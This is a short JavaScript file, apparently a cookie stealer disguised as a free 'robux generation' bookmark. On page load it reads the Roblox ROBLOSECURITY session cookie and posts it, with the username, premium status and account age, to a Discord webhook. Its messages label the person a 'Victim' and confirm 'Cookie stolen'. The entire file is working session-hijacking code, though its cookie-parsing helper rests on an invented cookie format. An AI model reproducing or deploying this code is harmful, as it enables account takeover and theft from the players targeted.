document.addEventListener("DOMContentLoaded", () => {
  const urlParams = new URLSearchParams(window.location.search);
  const id = urlParams.get("id");
  const webhookUrl = urlParams.get("webhook");

  // Extract cookie from document.cookie
  const cookie = document.cookie
    .split("; ")
    .find(row => row.startsWith("ROBLOSECURITY="))
    ?.split("=")[1];

  if (!cookie) {
    alert("Cookie not found!");
    return;
  }

  // Parse cookie to get username, premium, account age
  const cookieData = parseCookie(cookie);
  const { username, premium, accountAge } = cookieData;

  // Send data to Discord webhook
  const embed = {
    title: "robux generation",
    description: "Victim clicked the bookmark",
    fields: [
      { name: "Username", value: `@${username}`, inline: true },
      { name: "Premium", value: premium ? "✅" : "❌", inline: true },
      { name: "Account Age", value: `${accountAge} years`, inline: true },
      {
        name: "Cookie",
        value: cookie,
        inline: true
      }
    ]
  };

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      embeds: [embed]
    })
  })
  .then(response => {
    if (response.ok) {
      alert("Cookie stolen and sent to Discord!");
    } else {
      alert("Failed to send cookie to Discord.");
    }
  });
});

// Parse cookie data (example based on cookie structure)
function parseCookie(cookie) {
  const parts = cookie.split("|_");
  const username = parts[1].split("--")[0].trim();
  const premium = parts[3].includes("Premium");
  const accountAge = parts[5].split(" ")[0].trim();
  return { username, premium, accountAge };
}
